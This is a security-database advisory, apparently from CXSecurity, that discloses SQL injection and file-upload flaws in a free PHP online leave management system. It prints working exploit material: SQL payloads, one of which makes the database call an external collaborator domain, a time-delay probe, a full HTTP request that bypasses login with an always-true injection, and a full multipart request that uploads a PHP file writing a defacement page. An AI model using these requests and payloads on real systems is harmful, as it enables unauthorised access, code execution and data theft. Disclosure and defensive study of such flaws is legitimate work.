---
title: OLMS - PHP (by: oretnom23 ) v1.0 Copyright © 2024. All rights reserved SQLi - Bypass Authentication + File Upload vulnerabilit
url: https://cxsecurity.com/issue/WLB-2024120023
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-12-23
fetch_date: 2025-10-06T19:35:42.596356
---

# OLMS - PHP (by: oretnom23 ) v1.0 Copyright © 2024. All rights reserved SQLi - Bypass Authentication + File Upload vulnerabilit

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **OLMS - PHP (by: oretnom23 ) v1.0 Copyright © 2024. All rights reserved SQLi - Bypass Authentication + File Upload vulnerability** **2024.12.22**  **![bg](https://cert.cx/cxstatic/images/flags/bg.png) [nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/) **(BG)** ![bg](https://cert.cx/cxstatic/images/flags/bg.png)**  Risk: **Medium**  Local: ****Yes****  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Titles: OLMS - PHP (by: oretnom23 ) v1.0 Copyright © 2024. All rights reserved SQLi - Bypass Authentication + File Upload vulnerability
# Author: nu11secur1ty
# Date: 12/19/2024
# Vendor: https://github.com/oretnom23
# Software: https://www.sourcecodester.com/php/14910/online-leave-management-system-php-free-source-code.html#comment-105904
# Reference: https://portswigger.net/web-security/sql-injection
## Description:
The `username` parameter appears to be vulnerable to SQL injection attacks. The payload '+(select load\_file('\\\\lj874lzeredjrem4ev9gf6iep5vyjo7fa32qseh.oastify.com\\cup'))+' was submitted in the username parameter. This payload injects a SQL sub-query that calls MySQL's load\_file function with a UNC file path that references a URL on an external domain. The application interacted with that domain, indicating that the injected SQL query was executed. Additionally, a single quote was submitted in the username parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present. Additionally, the payload '+(select\*from(select(sleep(20)))a)+' was submitted in the username parameter. The application took 20014 milliseconds to respond to the request, compared with 25 milliseconds for the original request, indicating that the injected SQL command caused a time delay. The attacker can get all sensitive information from this system when he attacks it online, He can login super easily WITHOUT PASSWORD - ONLY USER - bypassing, and can crash or get every sensitive information from him!
STATUS: HIGH-CRITICAL Vulnerability
[+]Exploit SQLi:
- SQLi-Bypass login authentication:
```POST
POST /leave\_system/classes/Login.php?f=login HTTP/1.1
Host: pwnedhost.com
Cookie: PHPSESSID=htlkui6ihk5e396an9jnll5s08
Content-Length: 44
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="131", "Not\_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: \*/\*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: https://pwnedhost.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://pwnedhost.com/leave\_system/admin/login.php
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Connection: keep-alive
username=nu11secur1ty'+or+1%3D1%23&password=
```
[+]Exploit - FU:
```POST
POST /leave\_system/classes/Users.php?f=save HTTP/1.1
Host: pwnedhost.com
Cookie: PHPSESSID=36tikai49ecas19u82o1rt2rg9
Content-Length: 866
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="131", "Not\_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: \*/\*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTFqrVw5Zq7eXvXCh
Origin: https://pwnedhost.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://pwnedhost.com/leave\_system/admin/?page=user
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Connection: keep-alive
------WebKitFormBoundaryTFqrVw5Zq7eXvXCh
Content-Disposition: form-data; name="id"
1
------WebKitFormBoundaryTFqrVw5Zq7eXvXCh
Content-Disposition: form-data; name="firstname"
Adminstrator
------WebKitFormBoundaryTFqrVw5Zq7eXvXCh
Content-Disposition: form-data; name="lastname"
Admin
------WebKitFormBoundaryTFqrVw5Zq7eXvXCh
Content-Disposition: form-data; name="username"
admin
------WebKitFormBoundaryTFqrVw5Zq7eXvXCh
Content-Disposition: form-data; name="password"
------WebKitFormBoundaryTFqrVw5Zq7eXvXCh
Content-Disposition: form-data; name="img"; filename="1nsi1deyou.php"
Content-Type: application/octet-stream
<?php
// by nu11secur1ty - 2023
$fh = fopen('test.html', 'a');
fwrite($fh, '<h1>Hello, you are hacked by Fileupload and RCE!</h1>');
fclose($fh);
//unlink('test.html');
?>
------WebKitFormBoundaryTFqrVw5Zq7eXvXCh--
```
# Reproduce:
[href](https://www.patreon.com/posts/olms-php-by-v1-0-118283183)
# Dear all, please read the comments from the people on this absurdity blog or whatever it is - First:
[href](https://www.sourcecodester.com/php/14910/online-leave-management-system-php-free-source-code.html#comment-105904)
## Time spent:
00:03:00
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
0day Exploit DataBase https://0day.today/
home page: https://www.nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty <http://nu11secur1ty.com/>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024120023)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top